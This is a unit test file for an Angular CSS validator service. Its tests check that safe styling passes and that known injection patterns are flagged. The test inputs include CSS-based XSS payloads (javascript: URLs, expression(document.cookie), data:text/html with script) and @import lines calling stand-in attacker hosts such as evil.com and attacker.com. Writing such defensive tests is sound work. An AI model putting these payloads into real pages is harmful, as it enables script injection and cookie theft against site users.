import { TestBed } from '@angular/core/testing';
import { CssValidatorService } from './css-validator.service';

describe('CssValidatorService', () => {
  let service: CssValidatorService;

  beforeEach(() => {
    TestBed.configureTestingModule({});
    service = TestBed.inject(CssValidatorService);
  });

  it('should be created', () => {
    expect(service).toBeTruthy();
  });

  describe('validateCSS', () => {
    describe('Valid CSS', () => {
      it('should accept valid CSS with safe properties', () => {
        const css = 'color: blue; padding: 10px; margin: 5px;';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
        expect(result.warnings).toEqual([]);
        expect(result.errors).toEqual([]);
      });

      it('should accept empty CSS string', () => {
        const result = service.validateCSS('');

        expect(result.valid).toBe(true);
        expect(result.warnings).toEqual([]);
      });

      it('should accept whitespace-only CSS string', () => {
        const result = service.validateCSS('   ');

        expect(result.valid).toBe(true);
        expect(result.warnings).toEqual([]);
      });

      it('should accept CSS with HTTPS URLs', () => {
        const css = 'background: url(https://example.com/image.png);';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
        expect(result.warnings).toEqual([]);
      });

      it('should accept CSS at maximum length (5000 characters)', () => {
        const css = 'color: blue;'.repeat(416); // ~4992 characters
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
        expect(result.warnings).toEqual([]);
      });
    });

    describe('Length Validation', () => {
      it('should reject CSS exceeding 5000 character limit', () => {
        const css = 'a'.repeat(5001);
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain(
          'CSS exceeds 5000 character limit and will be rejected by server',
        );
      });

      it('should warn when CSS is exactly 5001 characters', () => {
        const css = 'color: blue; padding: 10px;'.repeat(186); // ~5022 characters
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings.length).toBeGreaterThan(0);
        expect(result.warnings[0]).toContain('CSS exceeds 5000 character limit');
      });
    });

    describe('Dangerous Pattern Detection', () => {
      it('should detect javascript: protocol', () => {
        const css = 'background: url(javascript:alert(1));';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain(
          "Pattern 'javascript:' may be blocked by server validation",
        );
      });

      it('should detect javascript: protocol (case insensitive)', () => {
        const css = 'background: url(JAVASCRIPT:alert(1));';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings.some((w) => w.includes('javascript:'))).toBe(true);
      });

      it('should detect expression() function', () => {
        const css = 'width: expression(alert(1));';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain(
          "Pattern 'expression(' may be blocked by server validation",
        );
      });

      it('should detect @import directive', () => {
        const css = '@import url("https://evil.com/style.css");';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain("Pattern '@import' may be blocked by server validation");
      });

      it('should detect HTTP URLs (non-HTTPS)', () => {
        const css = 'background: url(http://example.com/image.png);';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain(
          "Pattern 'url(http://' may be blocked by server validation",
        );
      });

      it('should detect <script tag', () => {
        const css = 'content: "<script>alert(1)</script>";';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain("Pattern '<script' may be blocked by server validation");
      });

      it('should detect onerror= attribute', () => {
        const css = 'background: url(image.png) onerror=alert(1);';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain("Pattern 'onerror=' may be blocked by server validation");
      });

      it('should detect onload= attribute', () => {
        const css = 'background: url(image.png) onload=alert(1);';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain("Pattern 'onload=' may be blocked by server validation");
      });

      it('should detect data:text/html URI', () => {
        const css = 'background: url(data:text/html,<script>alert(1)</script>);';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings).toContain(
          "Pattern 'data:text/html' may be blocked by server validation",
        );
      });
    });

    describe('Multiple Dangerous Patterns', () => {
      it('should detect multiple dangerous patterns in single CSS string', () => {
        const css =
          'background: url(javascript:alert(1)); width: expression(alert(2)); @import url("evil.css");';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings.length).toBe(3);
        expect(result.warnings).toContain(
          "Pattern 'javascript:' may be blocked by server validation",
        );
        expect(result.warnings).toContain(
          "Pattern 'expression(' may be blocked by server validation",
        );
        expect(result.warnings).toContain("Pattern '@import' may be blocked by server validation");
      });

      it('should detect both length violation and dangerous patterns', () => {
        const maliciousCSS = 'javascript:alert(1);'.repeat(300); // >5000 chars with dangerous pattern
        const result = service.validateCSS(maliciousCSS);

        expect(result.valid).toBe(false);
        expect(result.warnings.length).toBeGreaterThanOrEqual(2);
        expect(result.warnings.some((w) => w.includes('exceeds 5000 character limit'))).toBe(true);
        expect(result.warnings.some((w) => w.includes('javascript:'))).toBe(true);
      });
    });

    describe('Edge Cases', () => {
      it('should handle CSS with mixed case patterns', () => {
        const css = 'background: URL(JAVASCRIPT:alert(1));';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings.some((w) => w.includes('javascript:'))).toBe(true);
      });

      it('should handle CSS with whitespace around patterns', () => {
        const css = 'background: url( javascript:alert(1) );';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(false);
        expect(result.warnings.some((w) => w.includes('javascript:'))).toBe(true);
      });

      it('should handle malformed CSS gracefully', () => {
        const css = 'color blue padding 10px;;;';
        const result = service.validateCSS(css);

        // Should not throw error, but may or may not be valid depending on implementation
        expect(result).toBeDefined();
        expect(result.warnings).toBeDefined();
        expect(result.errors).toBeDefined();
      });

      it('should handle CSS with special characters', () => {
        const css = 'content: "Hello \\" World"; color: #f00;';
        const result = service.validateCSS(css);

        // Should handle escaped quotes without crashing
        expect(result).toBeDefined();
      });

      it('should handle CSS with newlines and tabs', () => {
        const css = 'color: blue;\n\tpadding: 10px;\n\tmargin: 5px;';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
        expect(result.warnings).toEqual([]);
      });
    });

    describe('Real-World CSS Examples', () => {
      it('should accept common form field styling', () => {
        const css = `
          color: #333;
          background-color: #f5f5f5;
          padding: 12px;
          border: 1px solid #ccc;
          border-radius: 4px;
          font-size: 14px;
        `;
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
      });

      it('should accept flexbox layout styles', () => {
        const css = 'display: flex; justify-content: center; align-items: center; gap: 10px;';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
      });

      it('should accept grid layout styles', () => {
        const css = 'display: grid; grid-template-columns: 1fr 1fr; grid-gap: 20px;';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
      });

      it('should accept shadow and opacity effects', () => {
        const css =
          'box-shadow: 0 2px 4px rgba(0,0,0,0.1); opacity: 0.9; text-shadow: 1px 1px 2px #000;';
        const result = service.validateCSS(css);

        expect(result.valid).toBe(true);
      });
    });

    describe('XSS Attack Vectors', () => {
      it('should detect CSS-based XSS with javascript protocol', () => {
        const attacks = [
          'background-image: url(javascript:alert("XSS"));',
          'list-style-image: url(javascript:void(alert(1)));',
          'background: url("javascript:alert(\'XSS\')");',
        ];

        attacks.forEach((attack) => {
          const result = service.validateCSS(attack);
          expect(result.valid).toBe(false);
          expect(result.warnings.some((w) => w.includes('javascript:'))).toBe(true);
        });
      });

      it('should detect IE expression-based XSS', () => {
        const attacks = [
          'width: expression(alert(1));',
          'height: expression(document.cookie);',
          'background-color: expression(alert("XSS"));',
        ];

        attacks.forEach((attack) => {
          const result = service.validateCSS(attack);
          expect(result.valid).toBe(false);
          expect(result.warnings.some((w) => w.includes('expression('))).toBe(true);
        });
      });

      it('should detect data URI XSS attempts', () => {
        const attack = 'background: url(data:text/html,<script>alert(1)</script>);';
        const result = service.validateCSS(attack);

        expect(result.valid).toBe(false);
        expect(result.warnings.some((w) => w.includes('data:text/html'))).toBe(true);
      });

      it('should detect import-based CSS injection', () => {
        const attacks = [
          '@import url("https://evil.com/steal.css");',
          "@import 'http://attacker.com/xss.css';",
          '@import url(//evil.com/inject.css);',
        ];

        attacks.forEach((attack) => {
          const result = service.validateCSS(attack);
          expect(result.valid).toBe(false);
          expect(result.warnings.some((w) => w.includes('@import'))).toBe(true);
        });
      });
    });
  });
});
